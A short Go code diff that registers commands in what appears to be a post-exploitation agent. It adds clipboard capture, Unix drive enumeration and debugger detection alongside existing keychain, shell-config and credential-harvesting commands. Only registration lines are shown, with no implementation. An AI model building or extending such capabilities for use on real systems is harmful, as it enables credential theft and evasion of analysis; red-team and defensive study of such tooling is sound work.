@@ -11,4 +11,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&KeychainCommand{})
 	RegisterCommand(&ShellConfigCommand{})
 	RegisterCommand(&CredHarvestCommand{})
+	RegisterCommand(&ClipboardCommand{})
+	RegisterCommand(&DrivesUnixCommand{})
+	RegisterCommand(&DebugDetectCommand{})
 }
